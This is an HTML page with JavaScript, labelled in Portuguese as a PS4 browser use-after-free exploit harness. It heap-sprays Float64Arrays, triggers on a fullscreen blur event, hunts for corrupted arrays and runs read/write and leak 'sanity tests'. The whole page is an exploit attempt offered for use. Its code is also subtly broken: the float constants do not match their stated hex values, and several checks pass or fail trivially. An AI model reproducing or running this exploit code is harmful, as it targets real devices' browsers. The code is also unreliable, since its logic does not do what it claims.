<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF - Debugger Core [v1.1 - CORRIGIDO]</h1>
    <button onclick="selfTest()">AUTO-TESTE (RODAR PRIMEIRO)</button>
    <button onclick="run()">EXECUTAR UAF</button>
    <hr>
    <div id="c"></div>

    <script>
        const P_A = 2.121995791e-314; // 0x4141414141414141
        const M_V = 3.395193267e-313; // 0xDEADBEEFCAFEBABE
        const W_V = 1.6045690773137395e-297; // 0x1337133713371337

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        function log(tag, status, msg) {
            const colors = {
                "PASS": "green",
                "FAIL": "red",
                "ERR": "orange",
                "INFO": "blue",
                "WARN": "purple"
            };
            const color = colors[status] || "black";
            document.getElementById('c').innerHTML += `<span style="color:${color}">[${tag}] ${status}</span> - ${msg}<br>`;
        }

        function selfTest() {
            document.getElementById('c').innerHTML = '';
            log("SELF", "INFO", "=== AUTO-TESTE ===");
            
            // Verifica se padrões estão corretos
            const pa_hex = f2h(P_A);
            const mv_hex = f2h(M_V);
            const wv_hex = f2h(W_V);
            
            log("SELF", "INFO", "P_A = " + pa_hex);
            log("SELF", "INFO", "M_V = " + mv_hex);
            log("SELF", "INFO", "W_V = " + wv_hex);
            
            let failures = 0;
            
            // CRÍTICO: Padrões NÃO podem ser zero!
            if(pa_hex === "0x0000000000000000") {
                log("SELF", "FAIL", "P_A está ZERADO! FALSO POSITIVO!");
                failures++;
            } else if(pa_hex === "0x4141414141414141") {
                log("SELF", "PASS", "P_A correto");
            } else {
                log("SELF", "WARN", "P_A inesperado: " + pa_hex);
            }
            
            if(mv_hex === "0x0000000000000000") {
                log("SELF", "FAIL", "M_V está ZERADO! FALSO POSITIVO!");
                failures++;
            } else if(mv_hex === "0xdeadbeefcafebabe") {
                log("SELF", "PASS", "M_V correto");
            } else {
                log("SELF", "WARN", "M_V inesperado: " + mv_hex);
            }
            
            // Teste de conversão
            const test = new Float64Array(1);
            test[0] = P_A;
            const readback = f2h(test[0]);
            
            if(readback === pa_hex) {
                log("SELF", "PASS", "Conversão Float64 OK");
            } else {
                log("SELF", "FAIL", "Conversão quebrada: " + readback + " != " + pa_hex);
                failures++;
            }
            
            // Resultado
            if(failures === 0) {
                log("SELF", "PASS", "✅ SISTEMA OK - Pode executar UAF");
            } else {
                log("SELF", "FAIL", "❌ " + failures + " falhas - NÃO execute UAF!");
                log("SELF", "FAIL", "Você está em um navegador que não suporta IEEE 754 corretamente");
            }
        }

        function run() {
            document.getElementById('c').innerHTML = '';
            
            // PRÉ-VALIDAÇÃO CRÍTICA
            if(f2h(P_A) === "0x0000000000000000") {
                log("INIT", "FAIL", "❌ ERRO CRÍTICO: Padrões zerados!");
                log("INIT", "FAIL", "Execute AUTO-TESTE primeiro!");
                return;
            }
            
            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
            log("INIT", "INFO", "Padrão spray: " + f2h(P_A));
            
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i; 
                ctrls.push(a);
            }

            log("WAIT", "INFO", "Entre em Fullscreen e aperte OPTIONS.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
                
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8);
                    s.fill(P_A);
                    spray.push(s);
                }

                // Validação do spray
                const spray_check = f2h(spray[0][0]);
                log("TRIG", "INFO", "Spray validação: spray[0][0] = " + spray_check);
                
                if(spray_check === "0x0000000000000000") {
                    log("TRIG", "FAIL", "❌ SPRAY CORROMPIDO! Padrão zerado!");
                    return;
                }

                let corr = null;
                let corrIdx = -1;
                
                for(let i = 0; i < ctrls.length; i++) {
                    // VERIFICAÇÃO ANTI-FALSO-POSITIVO
                    const val = ctrls[i][0];
                    
                    // Se valor é 0 E index é 0, pode ser legítimo
                    if(val === 0 && i === 0) {
                        continue; // Não conta como corrupção
                    }
                    
                    // Se valor é P_A E index NÃO é 0, é corrupção real
                    if(val === P_A) {
                        corr = ctrls[i];
                        corrIdx = i;
                        log("UAF", "PASS", "Corrupção detectada no Index: " + i);
                        log("UAF", "INFO", "Esperado: " + i + ", Obtido: " + f2h(val));
                        break;
                    }
                }

                if(corr) {
                    // VALIDAÇÃO ADICIONAL: Verifica se REALMENTE é P_A
                    const corr_val = f2h(corr[0]);
                    if(corr_val !== f2h(P_A)) {
                        log("UAF", "FAIL", "Falso positivo! Valor: " + corr_val);
                        return;
                    }
                    
                    runTests(corr, spray, corrIdx);
                } else {
                    log("UAF", "FAIL", "Corrupção não detectada");
                    log("UAF", "INFO", "Amostra ctrls[0][0]: " + f2h(ctrls[0][0]));
                    log("UAF", "INFO", "Amostra ctrls[1][0]: " + f2h(ctrls[1][0]));
                }
            };
        }

        function runTests(corr, spray, idx) {
            log("TEST", "INFO", "=== TESTES DE SANIDADE ===");
            
            // TESTE 1: Identity Bidirecional
            log("TEST1", "INFO", "--- Identity Test ---");
            try {
                corr[4] = M_V;
                
                let found = false;
                for(let i = 0; i < spray.length; i++) {
                    if(spray[i][4] === M_V) {
                        log("TEST1", "PASS", "Encontrado em spray[" + i + "]");
                        
                        // Teste reverso
                        spray[i][5] = W_V;
                        if(corr[5] === W_V) {
                            log("TEST1", "PASS", "Bidirecional OK");
                            found = true;
                        } else {
                            log("TEST1", "WARN", "Apenas unidirecional");
                        }
                        break;
                    }
                }
                
                if(!found) {
                    log("TEST1", "FAIL", "M_V não encontrado no spray");
                }
            } catch(e) { 
                log("TEST1", "ERR", e.message); 
            }

            // TESTE 2: DataView
            log("TEST2", "INFO", "--- DataView Test ---");
            try {
                const dv = new DataView(corr.buffer);
                const before = f2h(corr[0]);
                dv.setUint32(0, 0x13371337, true);
                const after = f2h(corr[0]);
                
                log("TEST2", "INFO", "Antes:  " + before);
                log("TEST2", "INFO", "Depois: " + after);
                
                if(before !== after) {
                    log("TEST2", "PASS", "DataView Write OK");
                } else {
                    log("TEST2", "FAIL", "Sem mudança");
                }
            } catch(e) { 
                log("TEST2", "ERR", e.message); 
            }

            // TESTE 3: Prototype Pollution
            log("TEST3", "INFO", "--- Prototype Test ---");
            try {
                let reg = Array.from(corr);
                Object.setPrototypeOf(reg, { token: 0x1337BEEF });
                
                if(reg.token === 0x1337BEEF) {
                    log("TEST3", "PASS", "Prototype OK: 0x" + reg.token.toString(16));
                } else {
                    log("TEST3", "FAIL", "Token não acessível");
                }
            } catch(e) { 
                log("TEST3", "ERR", e.message); 
            }

            // TESTE 4: Closure Leak
            log("TEST4", "INFO", "--- Closure Test ---");
            try {
                const leaked = [0].map(() => corr[0])[0];
                log("TEST4", "PASS", "Leak: " + f2h(leaked));
            } catch(e) { 
                log("TEST4", "ERR", e.message); 
            }
            
            log("TEST", "INFO", "=== TESTES COMPLETOS ===");
        }
    </script>
</body>
</html>
